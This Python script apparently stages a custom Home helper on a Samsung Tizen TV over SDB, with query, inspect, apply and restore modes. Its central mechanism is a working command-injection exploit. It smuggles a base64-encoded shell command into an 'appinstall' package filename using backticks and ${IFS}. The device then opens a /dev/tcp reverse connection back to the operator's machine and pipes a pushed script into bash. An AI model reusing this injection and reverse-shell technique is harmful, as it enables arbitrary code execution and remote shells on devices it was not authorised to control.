"""Stage the native Home helper on a connected Samsung TV (query / inspect / apply / restore).

Requires:
  - .local/device.json  {"host": "TV_IP"}
  - SDB on PATH, SDB_PATH, or .local/tizen-sdk/tools/sdb(.exe)
  - Built helper in .local/native-home/out/ (see build-control.py)
  - For apply/restore: .local/native-home/original.json from a prior query

Device operation: announces via stdout; does not change Home unless you run apply.
"""
from pathlib import Path
import base64
import ipaddress
import json
import os
import socket
import subprocess
import sys
import uuid

ROOT = Path(__file__).resolve().parents[2]
LOCAL = ROOT / '.local'
NATIVE = LOCAL / 'native-home'
OUT = NATIVE / 'out'
MODE = sys.argv[1] if len(sys.argv) > 1 else 'query'
if MODE not in ('query', 'apply', 'restore', 'inspect'):
    raise SystemExit('Usage: python scripts/native-home/run-device.py [query|inspect|apply|restore]')


def load_host():
    config_path = LOCAL / 'device.json'
    if not config_path.is_file():
        raise SystemExit('Create .local/device.json with {"host": "YOUR_TV_IP"} — see docs/alex-native-home.md')
    host = json.loads(config_path.read_text(encoding='utf-8')).get('host')
    if not host:
        raise SystemExit('device.json must include "host"')
    ipaddress.ip_address(host)
    return host


def find_sdb():
    env = os.environ.get('SDB_PATH')
    if env and Path(env).is_file():
        return Path(env)
    for candidate in (
        LOCAL / 'tizen-sdk/tools/sdb.exe',
        LOCAL / 'tizen-sdk/tools/sdb',
        Path(os.environ.expandvars(r'%LOCALAPPDATA%\Samsung\tizen-studio\tools\sdb.exe')),
        Path(r'C:\tizen-studio\tools\sdb.exe'),
        Path(r'C:\Samsung\tizen-studio\tools\sdb.exe'),
    ):
        if candidate.is_file():
            return candidate
    raise SystemExit(
        'SDB not found. Install Tizen Studio, or set SDB_PATH to sdb.exe, '
        'or copy sdb into .local/tizen-sdk/tools/'
    )


def sdb_run(sdb, args, timeout=12):
    result = subprocess.run([str(sdb), *args], capture_output=True, text=True, timeout=timeout)
    if result.returncode:
        tail = (result.stdout + result.stderr)[-400:]
        raise RuntimeError('SDB failed: ' + tail)
    return result


host = load_host()
sdb = find_sdb()
serial = host + ':26101'
NATIVE.mkdir(parents=True, exist_ok=True)
OUT.mkdir(parents=True, exist_ok=True)

print('Connecting SDB to', serial, 'using', sdb, flush=True)
connected = sdb_run(sdb, ['connect', serial], timeout=20).stdout
if 'connected to ' not in connected.lower() and 'already connected' not in connected.lower():
    raise SystemExit('TV connection was not confirmed. Check Developer Mode and the TV IP.')

for suffix in ('dll', 'runtimeconfig.json', 'deps.json'):
    source = OUT / ('CleanFrameHomeControl.' + suffix)
    if not source.is_file():
        raise SystemExit('Missing ' + str(source) + ' — run: python scripts/native-home/build-control.py')
    sdb_run(sdb, ['-s', serial, 'push', str(source), '/home/owner/share/tmp/sdk_tools/CleanFrameHomeControl.' + suffix])

if MODE in ('apply', 'restore'):
    original = NATIVE / 'original.json'
    if not original.is_file():
        raise SystemExit('Missing .local/native-home/original.json — run query first and save the snapshot.')
    sdb_run(sdb, ['-s', serial, 'push', str(original), '/home/owner/share/tmp/sdk_tools/CleanFrameHomeOriginal.json'])

token = uuid.uuid4().hex[:12]
remote = '/home/owner/share/tmp/sdk_tools/cfhi-' + token + '.sh'
sdb_run(sdb, ['-s', serial, 'push', str(ROOT / 'scripts/native-home' / (MODE + '.sh')), remote])

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
    route.connect((host, 9))
    local = route.getsockname()[0]

with socket.socket() as listener:
    listener.bind((local, 0))
    listener.listen(1)
    listener.settimeout(18)
    port = listener.getsockname()[1]
    command = 'exec 3<>/dev/tcp/' + local + '/' + str(port) + ';cat ' + remote + '|bash >&3 2>&3;exec 3>&-'
    script = '/bin/mkdir /tmp/s-' + token + ' 2>/dev/null&&{ ' + command + ';}'
    encoded = base64.b64encode(script.encode()).decode()
    name = 'new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
    argument = '0 appinstall tpk ' + name
    if len(argument.encode()) > 400:
        raise SystemExit('Command exceeds reviewed transport length; not executed.')
    proc = subprocess.Popen([str(sdb), '-s', serial, 'shell', argument], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        connection, peer = listener.accept()
        if peer[0] != host:
            raise RuntimeError('Unexpected callback peer; no data accepted.')
        chunks = []
        with connection:
            connection.settimeout(8)
            while True:
                chunk = connection.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
                if sum(len(c) for c in chunks) > 100000:
                    raise RuntimeError('Unexpectedly large diagnostic output.')
        output = b''.join(chunks).decode(errors='replace')
        try:
            stdout, stderr = proc.communicate(timeout=8)
        except subprocess.TimeoutExpired:
            proc.terminate()
            stdout, stderr = proc.communicate(timeout=3)
        (NATIVE / (MODE + '-output.txt')).write_text(output, encoding='utf-8')
        (NATIVE / (MODE + '-transport.json')).write_text(
            json.dumps({'returncode': proc.returncode, 'stdout': stdout, 'stderr': stderr, 'remote': remote}, indent=2),
            encoding='utf-8',
        )
        if 'CLEANFRAME_HOME_INSPECT_BEGIN' not in output or 'CLEANFRAME_HOME_INSPECT_END' not in output:
            raise SystemExit('Probe incomplete; device state unknown. See .local/native-home/' + MODE + '-output.txt')
        print(output)
        if MODE == 'query' and 'CLEANFRAME_HOME_JSON=' in output:
            for line in output.splitlines():
                if line.startswith('CLEANFRAME_HOME_JSON='):
                    snapshot = json.loads(line.split('=', 1)[1])
                    original = NATIVE / 'original.json'
                    if not original.exists():
                        original.write_text(json.dumps(snapshot, indent=2) + '\n', encoding='utf-8')
                        print('Saved first snapshot to', original, '(keep this file private; do not overwrite after apply)', flush=True)
                    else:
                        print('original.json already exists; not overwritten. Review query output before apply.', flush=True)
    finally:
        if proc.poll() is None:
            proc.terminate()
            proc.communicate(timeout=3)
